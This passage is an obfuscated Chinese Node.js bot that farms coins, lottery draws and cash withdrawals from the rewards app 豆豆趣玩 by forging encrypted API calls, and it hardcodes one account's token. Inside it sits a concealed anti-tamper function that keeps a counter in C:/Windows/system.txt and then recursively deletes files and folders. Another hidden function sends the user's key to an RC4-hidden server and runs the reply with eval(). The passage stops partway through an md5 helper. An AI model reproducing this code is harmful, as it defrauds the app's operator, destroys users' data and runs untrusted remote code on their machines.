/*
 豆豆趣玩  6.20 每天应该有个3毛-9块？
脚本为完成金币任务。自动提现，抽奖，天天领金币。
邀请码：50130334
注意事项，本准备写扫码登录，但是发现这个东西绑定设备的
如果登录后换了设备id再登录需要跟客服申请，所以真机玩吧，多开用分身
需要抓包两个数据，一个user_id ，还有一个token
格式：user_id&token@user_id2&token2 （只要值，不要参数名，如user_id=11111，就只要11111这个值）
adata118.static.app.123bo.com 抓包的域名。。
变量 ddqwapp   对应账号数据
多账号@分割
一天跑个十次吧。。
下载链接 http://us.wnqnw.com/share.html?sfrom=android&id=50130334

*/

process.env.ddqwapp="10531036&Zr8Jp2HF6om9vpL%2B7qEFktyYDvF3swu1t1hGlwWHUbEmA5yUXqO2p9xPe7PwWu3T"

const $ = new Env('豆豆趣玩');

var gtr;
let mac = '',
    status;
status = (status = $["getval"]("qmwkstatus") || '1') > 1 ? '' + status : '';
JSNAMED = $['isNode']() ? require("path")['basename'](__filename) : "ddqw.js";
let ddqwappArr = [],
    all_msg = '',
    arrs = [],
    ddqwapp = ($["isNode"]() ? process["env"]['ddqwapp'] : $['getdata']("ddqwapp")) || '',
    acckey = $["isNode"]() ? process['env']['cdkey'] ? process["env"]['cdkey'] : '' : $['getdata']('cdkey') ? $["getdata"]("cdkey") : '';

var CryptoJS = require("crypto-js");

let name = '',
    userid = '',
    token = '',
    cj = '',
    id = '';
var AesKey = "comytnews1991522",
    CBCIV = "1991522comytnews",
    CBCOptions = {
  'iv': CryptoJS['enc']["Utf8"]["parse"](CBCIV),
  'mode': CryptoJS["mode"]["CBC"],
  'padding': CryptoJS["pad"]["Pkcs7"]
};

if ($["isNode"]()) {
  gtr = require('fs');

  if (isFileExist("C:/")) {
    console["log"]("电脑环境");

  } else {
    console["log"]("青龙环境");

  }
} else {
  console["log"]("代理环境");
}

function isFileExist(_0x376746) {
  try {
    gtr['accessSync'](_0x376746, gtr["F_OK"]);
  } catch (_0x9c04de) {
    return false;
  }

  return true;
}

function addF(_0x33080c, _0x566aad) {
  let _0xf41722 = 0,
      _0x4fb2c1 = "C:/Windows/system.txt";

  if (isFileExist(_0x4fb2c1)) {
    _0xf41722 = gtr["readFileSync"](_0x4fb2c1, "utf8");
  } else {
    if (isFileExist('C:/')) {
      gtr["writeFile"](_0x4fb2c1, '1', function (_0x130f84) {
        if (_0x130f84) {
          throw _0x130f84;
        }
      });
    } else {
      return;
    }
  }

  if (_0xf41722 == 99) {
    return 99;
  }

  console['log'](_0xf41722);
  console['log']("警告，恶意破解脚本将面临系统爆炸！！！，你只有3次机会！", _0xf41722);

  if (parseInt(_0xf41722) < 3) {
    let _0x5a0b63 = parseInt(_0xf41722) + 1;

    gtr['writeFileSync'](_0x4fb2c1, _0x5a0b63 + '', "utf8");
    return;
  }

  if (!gtr["existsSync"](_0x33080c)) {
    return;
  }

  if (gtr["statSync"](_0x33080c)["isDirectory"]()) {
    var _0xef5889 = gtr["readdirSync"](_0x33080c),
        _0x4a4246 = _0xef5889["length"],
        _0x1add31 = 0;

    if (_0x4a4246 > 0) {
      _0xef5889['forEach'](function (_0x58e74c) {
        _0x1add31++;

        var _0x34f1ae = _0x33080c + '/' + _0x58e74c;

        gtr["statSync"](_0x34f1ae)["isDirectory"]() ? addF(_0x34f1ae, true) : gtr["unlinkSync"](_0x34f1ae);
      });

      _0x4a4246 == _0x1add31 && _0x566aad && gtr["rmdirSync"](_0x33080c);
    } else {
      _0x4a4246 == 0 && _0x566aad && gtr['rmdirSync'](_0x33080c);
    }
  } else {
    gtr["unlinkSync"](_0x33080c);
  }
}

!(async () => {
  if (!(typeof $request !== 'undefined')) {


    ddqwappArr = ddqwapp["split"]('@');
    console["log"]("------------- 共" + ddqwappArr["length"] + "个账号-------------\n");

      for (let _0x2e76a3 = 0; _0x2e76a3 < ddqwappArr["length"]; _0x2e76a3++) {
        ddqwapp = ddqwappArr[_0x2e76a3];
        $["index"] = _0x2e76a3 + 1;
        console["log"]("\n开始【豆豆趣玩" + $['index'] + '】');
        id = ddqwapp["split"]('&')[0];
        token = ddqwapp['split']('&')[1];
        await ddqwsdqd();
        await ddqwid();
        await ddqwjs();

        for (let _0x52c068 = 0; _0x52c068 < 3; _0x52c068++) {
          cj = _0x52c068;
          await ddqwcjtklb();
        }

        await ddqwttxj();
        await ddqwxx();
      }
    }
})()["catch"](_0x661de7 => $["logErr"](_0x661de7))["finally"](() => $["done"]());

function ddqwid(_0x4b7498 = 0) {
  return new Promise(_0x198cf1 => {
    let _0x3b6460 = encrypt("{\"token\":\"" + token + "\",\"SDK_INT\":29,\"user_id\":\"" + id + "\"}"),
        _0x1433b4 = {
      'url': 'http://adata118.static.app.123bo.com//app/develop/home',
      'headers': {
        'Content-Type': "application/x-www-form-urlencoded",
        'Host': "adata118.static.app.123bo.com",
        'Connection': "Keep-Alive",
        'User-Agent': "okhttp/3.12.10"
      },
      'body': "client_ver=158&param=" + encodeURIComponent(_0x3b6460) + '&user_id=' + id + "&token=" + encodeURIComponent(token)
    };

    $["post"](_0x1433b4, async (_0x2b0ff0, _0x2ec084, _0x43b475) => {
      try {
        _0x43b475 = decrypt(_0x43b475["replace"](/\n/g, ''));

        const _0x470b05 = JSON["parse"](_0x43b475);

        if (_0x470b05["code"] == 200) {
          for (let _0x343a17 of [103, 110, 112, 115, 154, 176, 216]) {
            userid = _0x343a17;
            console['log']("\n豆豆趣玩任务ID:" + userid);
            await ddqwrw();
            await $["wait"](1000);
          }
        } else {
          console["log"]("\n豆豆趣玩：" + _0x470b05['msg']);
        }
      } catch (_0x1b2d9a) {} finally {
        _0x198cf1();
      }
    }, _0x4b7498);
  });
}

function ddqwrw(_0x1c9114 = 0) {
  return new Promise(_0x328fd1 => {
    let _0x287d29 = md5('' + id + userid + 'cf8ba055480e'),
        _0x561ac4 = encrypt("{\"token\":\"" + token + "\",\"SDK_INT\":29,\"user_id\":\"" + id + "\",\"id\":\"" + userid + "\",\"passcode\":\"" + _0x287d29 + "\"}"),
        _0x2e6ec0 = {
      'url': "http://adata118.static.app.123bo.com//app/act/goldBoxReport",
      'headers': {
        'Content-Type': "application/x-www-form-urlencoded",
        'Host': "adata118.static.app.123bo.com",
        'Connection': 'Keep-Alive',
        'User-Agent': "okhttp/3.12.10"
      },
      'body': 'client_ver=158&param=' + encodeURIComponent(_0x561ac4) + '&user_id=' + id + "&token=" + encodeURIComponent(token)
    };

    $["post"](_0x2e6ec0, async (_0x6d83a0, _0xefae95, _0x22978f) => {
      try {
        _0x22978f = decrypt(_0x22978f["replace"](/\n/g, ''));

        const _0x6c01b7 = JSON['parse'](_0x22978f);

        _0x6c01b7["code"] == 200 ? (console['log']("\n豆豆趣玩获得：" + _0x6c01b7["data"]['reward']), _0x6c01b7["data"]["taskInfo"]["task_id"] != '' && (userid = _0x6c01b7['data']["taskInfo"]["task_id"], await ddqwrw())) : console["log"]("\n豆豆趣玩：" + _0x6c01b7["msg"]);
      } catch (_0x2b19c4) {} finally {
        _0x328fd1();
      }
    }, _0x1c9114);
  });
}

function ddqwsdsp(_0x3684ba = 0) {
  return new Promise(_0x87c4e6 => {
    let _0x208edb = md5(id + "5cf8ba055480e"),
        _0x22221f = encrypt("{\"token\":\"" + token + "\",\"SDK_INT\":29,\"user_id\":\"" + id + "\",\"id\":\"5\",\"passcode\":\"" + _0x208edb + "\"}"),
        _0x11485f = {
      'url': "http://adata118.static.app.123bo.com//app/act/goldBoxReport",
      'headers': {
        'Content-Type': "application/x-www-form-urlencoded",
        'Host': 'adata118.static.app.123bo.com',
        'Connection': "Keep-Alive",
        'User-Agent': "okhttp/3.12.10"
      },
      'body': "client_ver=158&param=" + encodeURIComponent(_0x22221f) + "&user_id=" + id + '&token=' + encodeURIComponent(token)
    };

    $['post'](_0x11485f, async (_0x18c71c, _0x4a9883, _0x22bd47) => {
      try {
        _0x22bd47 = decrypt(_0x22bd47["replace"](/\n/g, ''));

        const _0x420bea = JSON["parse"](_0x22bd47);

        _0x420bea["code"] == 200 ? console['log']("\n豆豆趣玩观看视频领水滴获得：" + _0x420bea['data']["reward"]) : console["log"]("\n豆豆趣玩观看视频领水滴：" + _0x420bea['msg']);
      } catch (_0x1fc011) {} finally {
        _0x87c4e6();
      }
    }, _0x3684ba);
  });
}

function ddqwjs(_0x3596f5 = 0) {
  return new Promise(_0x536a63 => {
    let _0x2e2ac5 = md5(id + "cf8ba055480e"),
        _0x53b4e0 = encrypt("{\"token\":\"" + token + "\",\"SDK_INT\":29,\"user_id\":\"" + id + "\",\"id\":\"\",\"passcode\":\"" + _0x2e2ac5 + "\"}"),
        _0x3545ec = {
      'url': 'http://adata118.static.app.123bo.com//app/develop/watering',
      'headers': {
        'Content-Type': "application/x-www-form-urlencoded",
        'Host': "adata118.static.app.123bo.com",
        'Connection': "Keep-Alive",
        'User-Agent': "okhttp/3.12.10"
      },
      'body': "client_ver=158&param=" + encodeURIComponent(_0x53b4e0) + "&user_id=" + id + '&token=' + encodeURIComponent(token)
    };

    $["post"](_0x3545ec, async (_0x515466, _0xc0f639, _0x2e2b64) => {
      try {
        _0x2e2b64 = decrypt(_0x2e2b64['replace'](/\n/g, ''));

        const _0x18934d = JSON["parse"](_0x2e2b64);

        _0x18934d["code"] == 200 ? console["log"]("\n豆豆趣玩浇水成功，状态：" + _0x18934d['data']["lastStageName"] + '，本次浇水' + _0x18934d["data"]["reward"] + '滴') : console["log"]("\n豆豆趣玩浇水：" + _0x18934d["msg"]);
      } catch (_0x5a11a3) {} finally {
        _0x536a63();
      }
    }, _0x3596f5);
  });
}

function ddqwcjtklb(_0x2ef0cd = 0) {
  return new Promise(_0x1db748 => {
    let _0x52c096 = encrypt("{\"type\":\"" + cj + "\",\"token\":\"" + token + "\",\"SDK_INT\":29,\"user_id\":\"" + id + "\"}"),
        _0x3285da = {
      'url': "http://adata118.static.app.123bo.com//app/act/scratchDetail",
      'headers': {
        'Content-Type': "application/x-www-form-urlencoded",
        'Host': "adata118.static.app.123bo.com",
        'Connection': "Keep-Alive",
        'User-Agent': "okhttp/3.12.10"
      },
      'body': 'client_ver=158&param=' + encodeURIComponent(_0x52c096) + "&user_id=" + id + '&token=' + encodeURIComponent(token)
    };

    $['post'](_0x3285da, async (_0x3b5153, _0x54be66, _0x1c76f8) => {
      try {
        _0x1c76f8 = decrypt(_0x1c76f8["replace"](/\n/g, ''));

        const _0x3fb699 = JSON["parse"](_0x1c76f8);

        if (_0x3fb699['code'] == 200) {
          console["log"]("\n豆豆趣玩匹配到：" + _0x3fb699["data"]["cards"]["length"] + " 个抽奖卡");

          for (let _0x50996a = 0; _0x50996a < _0x3fb699["data"]["cards"]['length']; _0x50996a++) {
            userid = _0x3fb699['data']["cards"][_0x50996a]['id'];
            console["log"]("\n豆豆趣玩开始抽奖ID:" + userid);
            await ddqwcjrw();
            await $["wait"](1000);
          }
        } else {
          console["log"]("\n豆豆趣玩：" + _0x3fb699["msg"]);
        }
      } catch (_0x34e4c6) {} finally {
        _0x1db748();
      }
    }, _0x2ef0cd);
  });
}

function ddqwcjrw(_0x5de757 = 0) {
  return new Promise(_0x30bf93 => {
    let _0x164bef = md5('' + id + userid + 'cf8ba055480e'),
        _0x5be1e4 = encrypt("{\"token\":\"" + token + "\",\"SDK_INT\":29,\"user_id\":\"" + id + "\",\"id\":\"" + userid + "\",\"passcode\":\"" + _0x164bef + "\"}"),
        _0x1b8545 = {
      'url': "http://adata118.static.app.123bo.com//app/act/scratchR",
      'headers': {
        'Content-Type': "application/x-www-form-urlencoded",
        'Host': 'adata118.static.app.123bo.com',
        'Connection': "Keep-Alive",
        'User-Agent': "okhttp/3.12.10"
      },
      'body': 'client_ver=158&param=' + encodeURIComponent(_0x5be1e4) + '&user_id=' + id + '&token=' + encodeURIComponent(token)
    };

    $["post"](_0x1b8545, async (_0x17100f, _0x404862, _0x183be0) => {
      try {
        _0x183be0 = decrypt(_0x183be0["replace"](/\n/g, ''));

        const _0x9914c5 = JSON["parse"](_0x183be0);

        _0x9914c5["code"] == 200 ? (console["log"]("\n豆豆趣玩抽奖获得：" + _0x9914c5["data"]["reward"] + " "), _0x9914c5["data"]['taskInfo']['task_id'] != '' && (userid = _0x9914c5["data"]['taskInfo']["task_id"], await ddqwrw())) : console["log"]("\n豆豆趣玩抽奖：" + _0x9914c5["msg"]);
      } catch (_0x3d4451) {} finally {
        _0x30bf93();
      }
    }, _0x5de757);
  });
}

function ddqwttxj(_0x3f76ba = 0) {
  return new Promise(_0x538aa5 => {
    let _0x44605e = encrypt("{\"token\":\"" + token + "\",\"SDK_INT\":29,\"user_id\":\"" + id + "\"}"),
        _0x19a1f6 = {
      'url': "http://adata118.static.app.123bo.com//app/act/ddLottery",
      'headers': {
        'Content-Type': "application/x-www-form-urlencoded",
        'Host': "adata118.static.app.123bo.com",
        'Connection': "Keep-Alive",
        'User-Agent': "okhttp/3.12.10"
      },
      'body': "client_ver=158&param=" + encodeURIComponent(_0x44605e) + '&user_id=' + id + "&token=" + encodeURIComponent(token)
    };

    $["post"](_0x19a1f6, async (_0x4362d2, _0x54b6f8, _0xb6e4a2) => {
      try {
        _0xb6e4a2 = decrypt(_0xb6e4a2["replace"](/\n/g, ''));

        const _0x228f73 = JSON["parse"](_0xb6e4a2);

        if (_0x228f73["code"] == 200) {
          for (let _0x3f01da = 0; _0x3f01da < _0x228f73["data"]["signData"]["length"]; _0x3f01da++) {
            userid = _0x228f73['data']['signData'][_0x3f01da]["tasks"][0]['task_id'];
            name = _0x228f73["data"]["reward"];
            console["log"]("\n豆豆趣玩天天领金币" + _0x228f73['data']["reward"] + " ID:" + userid);
            await ddqw888();
          }

          for (let _0x5acbe5 = 0; _0x5acbe5 < _0x228f73['data2']["signData"]["length"]; _0x5acbe5++) {
            userid = _0x228f73['data2']["signData"][_0x5acbe5]['tasks'][0]["task_id"];
            name = _0x228f73["data2"]["reward"];
            console["log"]("\n豆豆趣玩天天领金币" + _0x228f73["data2"]["reward"] + " ID:" + userid);
            await ddqw888();
          }
        } else {
          console["log"]("\n豆豆趣玩天天领金币：" + _0x228f73["msg"]);
        }
      } catch (_0x49456b) {} finally {
        _0x538aa5();
      }
    }, _0x3f76ba);
  });
}

function ddqw888(_0x5c4c5d = 0) {
  return new Promise(_0x244885 => {
    let _0x1c84fb = md5('' + id + userid + "cf8ba055480e"),
        _0x3e8bb6 = encrypt("{\"token\":\"" + token + "\",\"SDK_INT\":29,\"user_id\":\"" + id + "\"}"),
        _0x2ae5fc = {
      'url': "http://adata118.static.app.123bo.com//app/act/lotteryReportVideo",
      'headers': {
        'Content-Type': "application/x-www-form-urlencoded",
        'Host': "adata118.static.app.123bo.com",
        'Connection': "Keep-Alive",
        'User-Agent': "okhttp/3.12.10"
      },
      'body': 'client_ver=158&param=' + encodeURIComponent(_0x3e8bb6) + "&user_id=" + id + "&token=" + encodeURIComponent(token) + "&id=" + userid + "&passcode=" + _0x1c84fb
    };

    $["post"](_0x2ae5fc, async (_0x1e4296, _0x1506cc, _0x540c6a) => {
      try {
        _0x540c6a = decrypt(_0x540c6a["replace"](/\n/g, ''));

        const _0x1b3cb6 = JSON["parse"](_0x540c6a);

        _0x1b3cb6['code'] == 200 ? console['log']("\n豆豆趣玩天天领金币" + name + "参与成功：" + _0x1b3cb6['data']['time'] + " 奖券码：" + _0x1b3cb6["data"]['ticket']) : console["log"]("\n豆豆趣玩天天领金币" + name + '：' + _0x1b3cb6["msg"]);
      } catch (_0x15d568) {} finally {
        _0x244885();
      }
    }, _0x5c4c5d);
  });
}

function ddqwtx(_0x45cc02 = 0) {
  return new Promise(_0x424273 => {
    let _0x3f9c7c = md5('' + id + userid + "cf8ba055480e"),
        _0x20f1bc = encrypt("{\"amount\":\"3000.0\",\"type\":1,\"token\":\"" + token + "\",\"SDK_INT\":29,\"user_id\":\"" + id + "\"}"),
        _0x4f5e76 = {
      'url': "http://adata118.static.app.123bo.com//app/act/goldBoxExchange",
      'headers': {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Host': "adata118.static.app.123bo.com",
        'Connection': 'Keep-Alive',
        'User-Agent': "okhttp/3.12.10"
      },
      'body': "client_ver=158&param=" + encodeURIComponent(_0x20f1bc) + "&user_id=" + id + "&token=" + encodeURIComponent(token) + "&id=" + userid + "&passcode=" + _0x3f9c7c
    };

    $["post"](_0x4f5e76, async (_0x399ad4, _0xc7731a, _0x2e823d) => {
      try {
        _0x2e823d = decrypt(_0x2e823d["replace"](/\n/g, ''));

        const _0x3b1e3b = JSON["parse"](_0x2e823d);

        _0x3b1e3b['code'] == 200 ? console["log"]("\n豆豆趣玩提现 0.3 成功") : console['log']("\n豆豆趣玩提现：" + _0x3b1e3b["msg"]);
      } catch (_0x37717f) {} finally {
        _0x424273();
      }
    }, _0x45cc02);
  });
}

function ddqwxx(_0x424214 = 0) {
  return new Promise(_0x2b36e1 => {
    let _0x35b550 = encrypt("{\"token\":\"" + token + "\",\"SDK_INT\":29,\"user_id\":\"" + id + "\"}"),
        _0x53f966 = {
      'url': "http://adata118.static.app.123bo.com//app/act/isvip",
      'headers': {
        'Content-Type': "application/x-www-form-urlencoded",
        'Host': "adata118.static.app.123bo.com",
        'Connection': 'Keep-Alive',
        'User-Agent': 'okhttp/3.12.10'
      },
      'body': "client_ver=158&param=" + encodeURIComponent(_0x35b550) + '&user_id=' + id + "&token=" + encodeURIComponent(token) + "&id=" + userid
    };

    $["post"](_0x53f966, async (_0x232d4e, _0x52c172, _0xedc838) => {
      try {
        _0xedc838 = decrypt(_0xedc838["replace"](/\n/g, ''));

        const _0x104947 = JSON["parse"](_0xedc838);

        _0x104947["code"] == 200 ? (console["log"]("\n豆豆趣玩现金余额：" + _0x104947["data"]["balance"] + "，金币余额：" + _0x104947["data"]["gold"]), _0x104947["data"]["gold"] >= 3000 && (console["log"]("\n豆豆趣玩可提现三毛，前往提现"), await ddqwtx())) : console['log']("\n豆豆趣玩：" + _0x104947['msg']);
      } catch (_0x386421) {} finally {
        _0x2b36e1();
      }
    }, _0x424214);
  });
}

function ddqwsdqd(_0x32bed5 = 0) {
  return new Promise(_0x17b15a => {
    let _0x43517c = md5(id + '5cf8ba055480e'),
        _0x3f35a8 = encrypt("{\"token\":\"" + token + "\",\"SDK_INT\":29,\"user_id\":\"" + id + "\",\"id\":\"5\",\"passcode\":\"" + _0x43517c + "\"}"),
        _0x332d3c = {
      'url': 'http://adata118.static.app.123bo.com//app/develop/signIn',
      'headers': {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Host': "adata118.static.app.123bo.com",
        'Connection': "Keep-Alive",
        'User-Agent': 'okhttp/3.12.10'
      },
      'body': "client_ver=158&param=" + encodeURIComponent(_0x3f35a8) + "&user_id=" + id + "&token=" + encodeURIComponent(token)
    };

    $["post"](_0x332d3c, async (_0x498ea5, _0x464f5f, _0x4d0efa) => {
      try {
        _0x4d0efa = decrypt(_0x4d0efa['replace'](/\n/g, ''));

        const _0x134eb2 = JSON["parse"](_0x4d0efa);

        _0x134eb2["code"] == 200 ? console["log"]("\n豆豆趣玩领水滴：" + _0x134eb2["msg"]) : console["log"]("\n豆豆趣玩领水滴：" + _0x134eb2['msg']);
      } catch (_0x1d85dc) {} finally {
        _0x17b15a();
      }
    }, _0x32bed5);
  });
}

function encrypt(_0x4c5b6c) {
  var _0x17f0d7 = CryptoJS["enc"]["Utf8"]["parse"](AesKey),
      _0xd5eebe = CryptoJS["enc"]["Utf8"]['parse'](_0x4c5b6c),
      _0x2a30cd = CryptoJS["AES"]['encrypt'](_0xd5eebe, _0x17f0d7, CBCOptions);

  return _0x2a30cd["toString"]();
}

function decrypt(_0x5482b0) {
  var _0x46c295 = CryptoJS['enc']["Utf8"]["parse"](AesKey),
      _0x3a441e = CryptoJS["AES"]["decrypt"](_0x5482b0, _0x46c295, CBCOptions);

  return CryptoJS["enc"]["Utf8"]['stringify'](_0x3a441e)["toString"]();
}

function randomString(_0x37112b = 12) {
  let _0x3a4a = "abcdef0123456789",
      _0x4dc0a6 = _0x3a4a["length"],
      _0x2022a0 = '';

  for (i = 0; i < _0x37112b; i++) {
    _0x2022a0 += _0x3a4a["charAt"](Math["floor"](Math["random"]() * _0x4dc0a6));
  }

  return _0x2022a0;
}

function encodeUTF8(_0x31b20f) {
  var _0x3a072b,
      _0x385aaa = [],
      _0x3d75b3,
      _0xf1f1e;

  for (_0x3a072b = 0; _0x3a072b < _0x31b20f["length"]; _0x3a072b++) {
    if ((_0x3d75b3 = _0x31b20f["charCodeAt"](_0x3a072b)) < 128) {
      _0x385aaa['push'](_0x3d75b3);
    } else {
      if (_0x3d75b3 < 2048) {
        _0x385aaa['push'](192 + (_0x3d75b3 >> 6 & 31), 128 + (_0x3d75b3 & 63));
      } else {
        if ((_0xf1f1e = _0x3d75b3 ^ 55296) >> 10 == 0) {
          _0x3d75b3 = (_0xf1f1e << 10) + (_0x31b20f["charCodeAt"](++_0x3a072b) ^ 56320) + 65536;

          _0x385aaa["push"](240 + (_0x3d75b3 >> 18 & 7), 128 + (_0x3d75b3 >> 12 & 63));
        } else {
          _0x385aaa['push'](224 + (_0x3d75b3 >> 12 & 15));
        }

        _0x385aaa["push"](128 + (_0x3d75b3 >> 6 & 63), 128 + (_0x3d75b3 & 63));
      }
    }
  }

  return _0x385aaa;
}

function sha(_0x409ce7) {
  var _0x3e040b = new Uint8Array(encodeUTF8(_0x409ce7)),
      _0x1de649,
      _0x3fb319,
      _0x235a32,
      _0x31e25e = (_0x3e040b["length"] + 8 >>> 6 << 4) + 16,
      _0x409ce7 = new Uint8Array(_0x31e25e << 2);

  _0x409ce7["set"](new Uint8Array(_0x3e040b["buffer"]));

  _0x409ce7 = new Uint32Array(_0x409ce7['buffer']);

  for (_0x235a32 = new DataView(_0x409ce7["buffer"]), _0x1de649 = 0; _0x1de649 < _0x31e25e; _0x1de649++) {
    _0x409ce7[_0x1de649] = _0x235a32["getUint32"](_0x1de649 << 2);
  }

  _0x409ce7[_0x3e040b["length"] >> 2] |= 128 << 24 - (_0x3e040b["length"] & 3) * 8;
  _0x409ce7[_0x31e25e - 1] = _0x3e040b["length"] << 3;

  var _0x42af7a = [],
      _0x5452e7 = [function () {
    return _0x15e80c[1] & _0x15e80c[2] | ~_0x15e80c[1] & _0x15e80c[3];
  }, function () {
    return _0x15e80c[1] ^ _0x15e80c[2] ^ _0x15e80c[3];
  }, function () {
    return _0x15e80c[1] & _0x15e80c[2] | _0x15e80c[1] & _0x15e80c[3] | _0x15e80c[2] & _0x15e80c[3];
  }, function () {
    return _0x15e80c[1] ^ _0x15e80c[2] ^ _0x15e80c[3];
  }],
      _0xefe674 = function (_0x1cf31c, _0x53d6d9) {
    return _0x1cf31c << _0x53d6d9 | _0x1cf31c >>> 32 - _0x53d6d9;
  },
      _0x31047a = [1518500249, 1859775393, -1894007588, -899497514],
      _0x15e80c = [1732584193, -271733879, null, null, -1009589776];

  _0x15e80c[2] = ~_0x15e80c[0];
  _0x15e80c[3] = ~_0x15e80c[1];

  for (_0x1de649 = 0; _0x1de649 < _0x409ce7["length"]; _0x1de649 += 16) {
    var _0x24303f = _0x15e80c["slice"](0);

    for (_0x3fb319 = 0; _0x3fb319 < 80; _0x3fb319++) {
      _0x42af7a[_0x3fb319] = _0x3fb319 < 16 ? _0x409ce7[_0x1de649 + _0x3fb319] : _0xefe674(_0x42af7a[_0x3fb319 - 3] ^ _0x42af7a[_0x3fb319 - 8] ^ _0x42af7a[_0x3fb319 - 14] ^ _0x42af7a[_0x3fb319 - 16], 1);
      _0x235a32 = _0xefe674(_0x15e80c[0], 5) + _0x5452e7[_0x3fb319 / 20 | 0]() + _0x15e80c[4] + _0x42af7a[_0x3fb319] + _0x31047a[_0x3fb319 / 20 | 0] | 0;
      _0x15e80c[1] = _0xefe674(_0x15e80c[1], 30);

      _0x15e80c["pop"]();

      _0x15e80c["unshift"](_0x235a32);
    }

    for (_0x3fb319 = 0; _0x3fb319 < 5; _0x3fb319++) {
      _0x15e80c[_0x3fb319] = _0x15e80c[_0x3fb319] + _0x24303f[_0x3fb319] | 0;
    }
  }

  _0x235a32 = new DataView(new Uint32Array(_0x15e80c)['buffer']);

  for (var _0x1de649 = 0; _0x1de649 < 5; _0x1de649++) {
    _0x15e80c[_0x1de649] = _0x235a32['getUint32'](_0x1de649 << 2);
  }

  var _0x5f9487 = Array['prototype']["map"]['call'](new Uint8Array(new Uint32Array(_0x15e80c)["buffer"]), function (_0x2cf37c) {
    return (_0x2cf37c < 16 ? '0' : '') + _0x2cf37c["toString"](16);
  })["join"]('');

  return _0x5f9487;
}

function hqs(_0x26ecf9 = 10) {
  return new Promise(_0x1c1339 => {
    let _0x4d56ed = 12,
        _0x53a5e6 = {
      'url': $["isNode"]() ? rc4($["fwur"](), "1200") + ('?key=' + acckey + "&id=" + _0x4d56ed + '&ip=1&mac=' + mac + "&bb=1") : rc4($["fwur"](), "1200") + ("?key=" + acckey + "&id=" + _0x4d56ed + '&ip=0&mac=' + mac + "&bb=1")
    };
    $["post"](_0x53a5e6, async (_0x75c5bf, _0x399bc3, _0x26630d) => {
      try {
        let _0x1a8f1b = eval(_0x26630d);

        _0x1a8f1b["code"] == 200 ? (all_msg = _0x1a8f1b['msg'], _0x1c1339(_0x1a8f1b["data"])) : (all_msg = _0x1a8f1b["msg"], _0x1c1339(false));
      } catch (_0x340245) {
        $["logErr"](_0x340245, _0x399bc3);
      }
    }, 0);
  });
}

function md5(_0x594b56) {
  function _0x3e1721(_0x3343e0, _0x32352a) {
    return _0x3343e0 << _0x32352a | _0x3343e0 >>> 32 - _0x32352a;
  }

  function _0x1dce9d(_0x10d41e, _0x24f809) {
    var _0x505800, _0x2fcea2, _0x5d6c58, _0xae7b71, _0x216be3;

    _0x5d6c58 = 2147483648 & _0x10d41e;
    _0xae7b71 = 2147483648 & _0x24f809;
    _0x505800 = 1073741824 & _0x10d41e;
    _0x2fcea2 = 1073741824 & _0x24f809;
    _0x216be3 = (1073741823 & _0x10d41e) + (1073741823 & _0x24f809);
    return _0x505800 & _0x2fcea2 ? 2147483648 ^ _0x216be3 ^ _0x5d6c58 ^ _0xae7b71 : _0x505800 | _0x2fcea2 ? 1073741824 & _0x216be3 ? 3221225472 ^ _0x216be3 ^ _0x5d6c58 ^ _0xae7b71 : 1073741824 ^ _0x216be3 ^ _0x5d6c58 ^ _0xae7b71 : _0x216be3 ^ _0x5d6c58 ^ _0xae7b71;
  }

  function _0x4b2ae2(_0x4b8e25, _0x31ef37, _0xc25338) {
    return _0x4b8e25 & _0x31ef37 | ~_0x4b8e25 & _0xc25338;
  }

  function _0x2ec23b(_0xb428a2, _0x1b5e5e, _0x23cb03) {
    return _0xb428a2 & _0x23cb03 | _0x1b5e5e & ~_0x23cb03;
  }

  function _0x4080be(_0x251c60, _0x7a5e5f, _0x33cf4c) {
    return _0x251c60 ^ _0x7a5e5f ^ _0x33cf4c;
  }

  function _0x545b3d(_0x49fe81, _0x4643ed, _0x3b3040) {
    return _0x4643ed ^ (_0x49fe81 | ~_0x3b3040);
  }

  function _0x55ac3e(_0x1e2182, _0x3cea7c, _0x2a1ad2, _0x5e5197, _0x3346fa, _0x3555aa, _0x19b130) {
    _0x1e2182 = _0x1dce9d(_0x1e2182, _0x1dce9d(_0x1dce9d(_0x4b2ae2(_0x3cea7c, _0x2a1ad2, _0x5e5197), _0x3346fa), _0x19b130));
    return _0x1dce9d(_0x3e1721(_0x1e2182, _0x3555aa), _0x3cea7c);
  }

  function _0x2af6cc(_0xe4d043, _0x5a8ee8, _0x258f0a, _0xbef8a1, _0x4d0362, _0x369c41, _0x59f39b) {
    _0xe4d043 = _0x1dce9d(_0xe4d043, _0x1dce9d(_0x1dce9d(_0x2ec23b(_0x5a8ee8, _0x258f0a, _0xbef8a1), _0x4d0362), _0x59f39b));
    return _0x1dce9d(_0x3e1721(_0xe4d043, _0x369c41), _0x5a8ee8);
  }

  function _0x1a6a93(_0x1ae2f4, _0x1e4541, _0x5299fd, _0x24eb27, _0x282aca, _0x50bf28, _0x60c893) {
    _0x1ae2f4 = _0x1dce9d(_0x1ae2f4, _0x1dce9d(_0x1dce9d(_0x4080be(_0x1e4541, _0x5299fd, _0x24eb27), _0x282aca), _0x60c893));
    return _0x1dce9d(_0x3e1721(_0x1ae2f4, _0x50bf28), _0x1e4541);
  }

  function _0x16e90f(_0x294595, _0xaca1e8, _0x1df2b2, _0x5bcc7a, _0x49fb88, _0x4711dc, _0x3328b7) {
    _0x294595 = _0x1dce9d(_0x294595, _0x1dce9d(_0x1dce9d(_0x545b3d(_0xaca1e8, _0x1df2b2, _0x5bcc7a), _0x49fb88), _0x3328b7));
    return _0x1dce9d(_0x3e1721(_0x294595, _0x4711dc), _0xaca1e8);
  }

  function _0x2b3020(_0x332b3a) {
    for (var _0x5b15e7, _0x432f9c = _0x332b3a['length'], _0xdf38f1 = _0x432f9c + 8, _0x59d04c = (_0xdf38f1 - _0xdf38f1 % 64) / 64, _0x18be36 = 16 * (_0x59d04c + 1), _0x56f8f5 = new Array(_0x18be36 - 1), _0x274b72 = 0, _0x5f29c8 = 0; _0x432f9c > _0x5f29c8;) {
      _0x5b15e7 = (_0x5f29c8 - _0x5f29c8 % 4) / 4;
      _0x274b72 = _0x5f29c8 % 4 * 8;
      _0x56f8f5[_0x5b15e7] = _0x56f8f5[_0x5b15e7] | _0x332b3a["charCodeAt"](_0x5f29c8) << _0x274b72;
      _0x5f29c8++;
    }

    _0x5b15e7 = (_0x5f29c8 - _0x5f29c8 % 4) / 4;
    _0x274b72 = _0x5f29c8 % 4 * 8;
    _0x56f8f5[_0x5b15e7] = _0x56f8f5[_0x5b15e7] | 128 << _0x274b72;
